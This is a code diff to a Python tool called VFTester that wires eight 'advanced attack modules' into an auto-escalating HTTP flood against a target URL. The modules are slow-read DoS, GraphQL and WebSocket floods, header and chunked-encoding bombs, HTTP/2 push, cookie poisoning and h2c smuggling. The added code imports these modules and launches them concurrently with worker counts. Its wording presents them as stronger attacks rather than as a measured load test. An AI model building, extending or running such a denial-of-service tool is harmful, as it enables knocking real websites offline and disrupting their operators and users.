@@ -36,6 +36,16 @@ Keyboard Controls (during run):
 
 Requirements:
   pip install aiohttp httpx[http2] aiohttp-socks beautifulsoup4
+
+Advanced Modules (in tester/ folder):
+  vf_slow_read.py     — Slow READ DoS attack
+  vf_graphql_flood.py — GraphQL endpoint flood
+  vf_ws_flood.py      — WebSocket flood
+  vf_header_bomb.py   — Header size bomb
+  vf_h2_push.py       — HTTP/2 multiplex push
+  vf_chunked_bomb.py  — Chunked transfer encoding bomb
+  vf_cookie_poison.py — Cookie rotation/poisoning
+  vf_h2c_smuggler.py  — HTTP/2 cleartext smuggling
 """
 
 import asyncio
@@ -109,6 +119,51 @@ except ImportError:
 if not HAS_AIOHTTP:
     print("[ERROR] aiohttp is required! pip install aiohttp")
     sys.exit(1)
+
+# ═══ Advanced Attack Module Imports ═══
+# Import specialized attack modules from the tester/ package.
+# These provide far more sophisticated attacks than the built-in workers.
+_ADVANCED_MODULES = {}
+try:
+    from vf_slow_read import SlowREADAttacker
+    _ADVANCED_MODULES['slow_read'] = SlowREADAttacker
+except ImportError:
+    pass
+try:
+    from vf_graphql_flood import GraphQLFloodAttacker
+    _ADVANCED_MODULES['graphql_flood'] = GraphQLFloodAttacker
+except ImportError:
+    pass
+try:
+    from vf_ws_flood import WebSocketFloodAttacker
+    _ADVANCED_MODULES['ws_flood'] = WebSocketFloodAttacker
+except ImportError:
+    pass
+try:
+    from vf_header_bomb import HeaderBombAttacker
+    _ADVANCED_MODULES['header_bomb'] = HeaderBombAttacker
+except ImportError:
+    pass
+try:
+    from vf_h2_push import H2PushAttacker
+    _ADVANCED_MODULES['h2_push'] = H2PushAttacker
+except ImportError:
+    pass
+try:
+    from vf_chunked_bomb import ChunkedBombAttacker
+    _ADVANCED_MODULES['chunked_bomb'] = ChunkedBombAttacker
+except ImportError:
+    pass
+try:
+    from vf_cookie_poison import CookiePoisonAttacker
+    _ADVANCED_MODULES['cookie_poison'] = CookiePoisonAttacker
+except ImportError:
+    pass
+try:
+    from vf_h2c_smuggler import H2CSmuggler
+    _ADVANCED_MODULES['h2c_smuggler'] = H2CSmuggler
+except ImportError:
+    pass
 
 
 # ═══════════════════════════════════════════════════════════════════════════════
@@ -1969,6 +2024,12 @@ class VFTester:
         print(f"  Vectors:  {', '.join(vectors)}")
         print(f"  Workers:  {C.BD}{actual_max:,}{C.RS} (initial: {self.initial_workers}, step: +{self.step})")
         print(f"  Pages:    {len(pages)} | Resources: {len(resources)}")
+        # Advanced Attack Modules loaded
+        if _ADVANCED_MODULES:
+            mod_names = ', '.join(_ADVANCED_MODULES.keys())
+            print(f"  Modules:  {C.G}{mod_names}{C.RS}")
+        else:
+            print(f"  Modules:  {C.Y}No advanced modules loaded{C.RS}")
         print(f"  Mode:     {C.Y}AUTO-ESCALATE — gradually increasing pressure{C.RS}")
         print(f"  Controls: {C.BD}[+]{C.RS} Add workers  {C.BD}[-]{C.RS} Remove  {C.BD}[q]{C.RS} Quit")
         print(f"{'='*72}\n")
@@ -1996,6 +2057,7 @@ class VFTester:
                 await self._refresh_viewstate(session)
 
             all_tasks = []
+            advanced_tasks = []  # Separate list for advanced module tasks
             cur = 0
 
             # Initial workers — start LOW for auto-escalation
@@ -2003,6 +2065,73 @@ class VFTester:
                 delay = random.uniform(0, 2.0)
                 self._spawn_worker(session, all_tasks, vectors, pages, resources, delay=delay)
                 cur += 1
+
+            # ═══ Launch Advanced Attack Modules ═══
+            # These run as separate async tasks alongside the built-in workers.
+            # Each module gets its own stop_event so they can be stopped independently.
+            advanced_attackers = {}
+            if _ADVANCED_MODULES:
+                # Calculate workers per module — distribute based on strategy
+                module_worker_count = max(10, self.initial_workers // max(len(_ADVANCED_MODULES), 1))
+
+                if 'slow_read' in _ADVANCED_MODULES:
+                    attacker = _ADVANCED_MODULES['slow_read'](url=self.url, workers=module_worker_count, read_delay=1.0)
+                    advanced_attackers['slow_read'] = attacker
+                    t = asyncio.create_task(attacker.attack(self._stop))
+                    advanced_tasks.append(t)
+                    print(f"  {C.Y}[SLOW-READ] Module launched — {module_worker_count} workers{C.RS}")
+
+                if 'graphql_flood' in _ADVANCED_MODULES:
+                    attacker = _ADVANCED_MODULES['graphql_flood'](url=self.url, workers=module_worker_count)
+                    advanced_attackers['graphql_flood'] = attacker
+                    t = asyncio.create_task(attacker.attack(self._stop))
+                    advanced_tasks.append(t)
+                    print(f"  {C.G}[GQL-FLOOD] Module launched — {module_worker_count} workers{C.RS}")
+
+                if 'ws_flood' in _ADVANCED_MODULES:
+                    attacker = _ADVANCED_MODULES['ws_flood'](url=self.url, workers=module_worker_count, messages_per_second=10)
+                    advanced_attackers['ws_flood'] = attacker
+                    t = asyncio.create_task(attacker.attack(self._stop))
+                    advanced_tasks.append(t)
+                    print(f"  {C.B}[WS-FLOOD] Module launched — {module_worker_count} workers{C.RS}")
+
+                if 'header_bomb' in _ADVANCED_MODULES:
+                    attacker = _ADVANCED_MODULES['header_bomb'](url=self.url, workers=max(5, module_worker_count // 3), header_size_kb=64)
+                    advanced_attackers['header_bomb'] = attacker
+                    t = asyncio.create_task(attacker.attack(self._stop))
+                    advanced_tasks.append(t)
+                    print(f"  {C.R}[HEADER-BOMB] Module launched — {max(5, module_worker_count // 3)} workers{C.RS}")
+
+                if 'h2_push' in _ADVANCED_MODULES:
+                    attacker = _ADVANCED_MODULES['h2_push'](url=self.url, workers=max(5, module_worker_count // 2), streams_per_connection=100)
+                    advanced_attackers['h2_push'] = attacker
+                    t = asyncio.create_task(attacker.attack(self._stop))
+                    advanced_tasks.append(t)
+                    print(f"  {C.M}[H2-PUSH] Module launched — {max(5, module_worker_count // 2)} workers{C.RS}")
+
+                if 'chunked_bomb' in _ADVANCED_MODULES:
+                    attacker = _ADVANCED_MODULES['chunked_bomb'](url=self.url, workers=max(5, module_worker_count // 2), chunk_delay=5.0)
+                    advanced_attackers['chunked_bomb'] = attacker
+                    t = asyncio.create_task(attacker.attack(self._stop))
+                    advanced_tasks.append(t)
+                    print(f"  {C.M}[CHUNKED-BOMB] Module launched — {max(5, module_worker_count // 2)} workers{C.RS}")
+
+                if 'cookie_poison' in _ADVANCED_MODULES:
+                    attacker = _ADVANCED_MODULES['cookie_poison'](url=self.url, workers=max(5, module_worker_count // 2))
+                    advanced_attackers['cookie_poison'] = attacker
+                    t = asyncio.create_task(attacker.attack(self._stop))
+                    advanced_tasks.append(t)
+                    print(f"  {C.G}[COOKIE-POISON] Module launched — {max(5, module_worker_count // 2)} workers{C.RS}")
+
+                if 'h2c_smuggler' in _ADVANCED_MODULES:
+                    attacker = _ADVANCED_MODULES['h2c_smuggler'](url=self.url, workers=max(5, module_worker_count // 2))
+                    advanced_attackers['h2c_smuggler'] = attacker
+                    t = asyncio.create_task(attacker.attack(self._stop))
+                    advanced_tasks.append(t)
+                    print(f"  {C.CY}[H2C-SMUGGLER] Module launched — {max(5, module_worker_count // 2)} workers{C.RS}")
+
+                if advanced_tasks:
+                    print(f"\n  {C.BD}{C.G}[*] {len(advanced_tasks)} advanced attack module(s) running!{C.RS}\n")
 
             while not self._stop.is_set():
                 # Handle keyboard
@@ -2141,6 +2270,12 @@ class VFTester:
             # Cleanup
             await self.keyboard.stop()
             self._stop.set()
+            # Cancel advanced module tasks
+            if advanced_tasks:
+                for t in advanced_tasks:
+                    t.cancel()
+                await asyncio.gather(*advanced_tasks, return_exceptions=True)
+            # Cancel built-in worker tasks
             if all_tasks:
                 done, pending = await asyncio.wait(all_tasks, timeout=3)
                 for t in pending: t.cancel()
